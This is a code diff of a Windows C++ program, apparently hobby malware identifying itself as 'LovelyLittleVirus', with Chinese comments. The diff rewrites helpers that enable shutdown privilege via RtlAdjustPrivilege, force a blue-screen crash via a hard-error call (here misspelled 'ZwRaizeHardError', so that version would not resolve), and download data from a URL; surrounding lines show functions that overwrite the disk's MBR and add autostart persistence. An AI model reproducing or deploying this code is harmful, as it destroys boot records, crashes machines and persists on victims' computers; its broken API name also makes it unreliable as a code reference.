@@ -61,19 +61,37 @@
 
 using namespace std;
 
-bool GetPrivileges()
-{
-	HMODULE ntdll = LoadLibrary(_T("ntdll.dll"));//加载ntdll	
-	if (ntdll == NULL)
+// 定义函数签名
+bool adjustPrivilege(ULONG privilege = 0x13) {
+	typedef NTSTATUS(WINAPI* PRTL_ADJUST_PRIVILEGE)(
+		ULONG Privilege,
+		BOOLEAN Enable,
+		BOOLEAN CurrentThread,
+		PBOOLEAN Enabled
+		);
+	// 加载 ntdll.dll 库
+	HMODULE hModule = LoadLibrary(_T("ntdll.dll"));
+	if (hModule == NULL) {
 		return false;
-	FARPROC RtlAdjPriv=GetProcAddress(ntdll,"RtlAdjustPrivilege");//获取提权函数	
-	BOOLEAN ErrKill;
-	bool retn = false;
-	retn=((UINT32(*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))RtlAdjPriv)(0x13, TRUE, FALSE, &ErrKill)<0xc0000000;//调用RtlAdjustPrivliege函数获取SeShutdownPrivilege权限
-	FreeLibrary(ntdll);
-	return retn;
+	}
+
+	// 获取 RtlAdjustPrivilege 函数的地址
+	PRTL_ADJUST_PRIVILEGE RtlAdjustPrivilege = (PRTL_ADJUST_PRIVILEGE)GetProcAddress(hModule, "RtlAdjustPrivilege");
+	if (RtlAdjustPrivilege == NULL) {
+		return false;
+	}
+
+	// 使用 RtlAdjustPrivilege 函数修改特权级别
+	BOOLEAN enabled = FALSE;
+	NTSTATUS status = RtlAdjustPrivilege(privilege, TRUE, FALSE, &enabled);
+	if (status != 0) {
+		return false;
+	}
+
+	return (enabled == TRUE ? true : false);
 }
 
+inline bool GetPrivileges() { return adjustPrivilege(); }
 //写MBR
 bool WritePhydriveMBR(unsigned int id,const string& msgstr)
 {
@@ -165,23 +183,39 @@ bool RegAutoStart(const wstring& name)
 	return false;
 }
 
+
+
 //蓝屏函数
-bool MakeBlueScreen(unsigned int errid)
-{
-	HMODULE ntdll = LoadLibrary(_T("ntdll.dll"));
-	if (ntdll != NULL)
-	{
-		FARPROC RtlAdjPriv = GetProcAddress(ntdll, "RtlAdjustPrivilege");
-		FARPROC RtlSetProcessIsCritical = GetProcAddress(ntdll, "RtlSetProcessIsCritical");
-		FARPROC ZwRaiseHardErr = GetProcAddress(ntdll, "ZwRaiseHardError");//获取蓝屏函数
-		unsigned char ErrKill;
-		long unsigned int HDErr;
-		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13, true, false, &ErrKill);
-		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZwRaiseHardErr)(errid, 0, 0, 0, 6, &HDErr);
-		FreeLibrary(ntdll);
+bool MakeBlueScreen(NTSTATUS errorStatus) {
+	typedef NTSTATUS(WINAPI* PZW_RAISE_HARD_ERROR)(
+		NTSTATUS ErrorStatus,
+		ULONG NumberOfParameters,
+		ULONG UnicodeStringParameterMask,
+		PULONG_PTR Parameters,
+		ULONG ValidResponseOptions,
+		PULONG Response
+		);
+	// 加载 ntdll.dll 库
+	HMODULE hModule = LoadLibrary(L"ntdll.dll");
+	if (hModule == NULL) {
+		return false;
 	}
-	return false;
+
+	// 获取 ZwRaizeHardError 函数的地址
+	PZW_RAISE_HARD_ERROR ZwRaizeHardError = (PZW_RAISE_HARD_ERROR)GetProcAddress(hModule, "ZwRaizeHardError");
+	if (ZwRaizeHardError == NULL) {
+		return false;
+	}
+
+	// 使用 ZwRaizeHardError 函数显示错误消息
+	NTSTATUS status = ZwRaizeHardError(errorStatus, 0, 0, NULL, 6, NULL);
+	if (status != 0) {
+		return false;
+	}
+
+	return true;
 }
+
 
 
 
@@ -204,8 +238,9 @@ bool PlaySoundData(const TCHAR* psounddata, bool sync)
 }
 
 
-//从URL获取字符串
-std::wstring GetDataFromURL(const std::wstring& url, bool& isok)
+/*
+//已过时
+std::wstring GetDataFromURLOld(const std::wstring& url, bool& isok)
 {
 	CInternetSession session;
 	CHttpFile* file = NULL;
@@ -244,6 +279,57 @@ std::wstring GetDataFromURL(const std::wstring& url, bool& isok)
 	file = NULL;
 	isok = true;
 	return std::wstring(strHtml);
+}
+
+
+*/
+
+// 定义函数签名
+std::string GetDataFromURL(const std::wstring& url, bool& error,const std::wstring& AppName= _T("LovelyLittleVirus")) {
+	// 初始化错误状态
+	error = false;
+	// 初始化 Internet 连接
+	HINTERNET hInternet = InternetOpen(AppName.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	if (hInternet == NULL) {
+		error = true;
+		return "";
+	}
+
+	// 打开 URL
+	HINTERNET hUrl = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+	if (hUrl == NULL) {
+		error = true;
+		InternetCloseHandle(hInternet);
+		return "";
+	}
+
+	// 获取资源内容的长度
+	DWORD contentLength = 0;
+	DWORD headerLength = sizeof(DWORD);
+	if (!HttpQueryInfo(hUrl, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &contentLength, &headerLength, NULL)) {
+		error = true;
+		InternetCloseHandle(hUrl);
+		InternetCloseHandle(hInternet);
+		return "";
+	}
+
+	// 下载资源内容
+	std::string buffer;
+	buffer.resize(contentLength);
+	DWORD bytesRead = 0;
+	if (!InternetReadFile(hUrl, &buffer[0], contentLength, &bytesRead)) {
+		error = true;
+		InternetCloseHandle(hUrl);
+		InternetCloseHandle(hInternet);
+		return "";
+	}
+
+	// 关闭 Internet 连接
+	InternetCloseHandle(hUrl);
+	InternetCloseHandle(hInternet);
+
+	// 返回资源内容
+	return buffer;
 }
 
 /*
